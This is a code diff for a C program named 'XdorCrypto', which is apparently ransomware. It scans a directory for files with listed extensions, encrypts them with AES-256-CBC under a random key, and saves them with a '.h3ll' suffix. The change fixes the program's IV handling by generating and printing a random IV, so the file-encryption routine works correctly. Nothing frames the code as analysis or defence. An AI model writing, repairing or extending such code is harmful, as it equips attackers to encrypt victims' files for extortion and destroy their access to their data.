@@ -11,7 +11,6 @@
 struct filez {
     const unsigned char *buffer;
     size_t size;
-    unsigned char iv[AES_BLOCK_SIZE];
 };
 typedef struct filez Filez;
 
@@ -50,7 +49,8 @@ const char *allowedExtensions[] = {
      ".nef", ".ai", ".djvu", ".m4u", ".m3u", ".mid", ".asf", ".vob", ".fla", ".sh"
 };
 
-unsigned char encryptionKey[65]; 
+unsigned char encryptionKey[65];
+unsigned char iv[AES_BLOCK_SIZE];
 
 void generateRandomKey(unsigned char *key, int size) {
     RAND_bytes(key, size);
@@ -66,6 +66,7 @@ void printHex(const unsigned char *buffer, size_t size) {
 
 int main(int argc, const char *argv[]) {
     generateRandomKey(encryptionKey, 64);
+    generateRandomKey(iv, AES_BLOCK_SIZE);
 
     const char *path;
     if (argc == 1) {
@@ -80,7 +81,7 @@ int main(int argc, const char *argv[]) {
     printf("[STATUS] Iniciando XdorCrypto.\n");sleep(1);printf("[STATUS] Carregando dependencias.\n");sleep(1);
     printf("[STATUS] Gerando keys \n\n");printf("");
     int duration_ms = 5000 ; int steps = 28; spinAnimation(duration_ms, steps);
-    printf("Chave AES-Hexa : ");printHex(encryptionKey, 32);sleep(1);
+    printf("Chave AES-Hexa : ");printHex(encryptionKey, 32);printf("IV: ");printHex(iv, AES_BLOCK_SIZE);sleep(1);
     printf("Localizando arquivos do alvo.\n\n");
     DIR *dir;
     struct dirent *entry;
@@ -136,7 +137,7 @@ void encryptFile(const char *filename) {
     unsigned char encryptedBuffer[file.size];
     AES_KEY encKey;
     AES_set_encrypt_key(encryptionKey, 256, &encKey);
-    AES_cbc_encrypt(file.buffer, encryptedBuffer, file.size, &encKey, file.iv, AES_ENCRYPT);
+    AES_cbc_encrypt(file.buffer, encryptedBuffer, file.size, &encKey, iv, AES_ENCRYPT);
 
     char encryptedFilename[256];
     snprintf(encryptedFilename, sizeof(encryptedFilename), "%s.h3ll", filename);
